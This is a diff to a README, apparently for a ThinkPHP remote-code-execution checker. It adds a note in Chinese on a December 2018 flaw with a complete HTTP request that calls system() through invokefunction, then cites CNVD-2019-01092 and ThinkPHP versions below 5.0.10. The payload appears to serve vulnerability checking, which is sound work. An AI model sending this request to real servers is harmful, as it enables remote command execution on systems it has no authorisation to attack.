@@ -1,5 +1,24 @@
 # thinkphp_rce_check
 
+2018年12月爆出的代码执行
+
+```
+GET /tp5022/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=path HTTP/1.1
+Host: 127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+DNT: 1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Content-Length: 2
+
+```
+
+
+---
+2019年1月陆续爆出的代码执行
+
 CNVD-2019-01092
 
 ## thinkphp 5.0.10 以下版本 
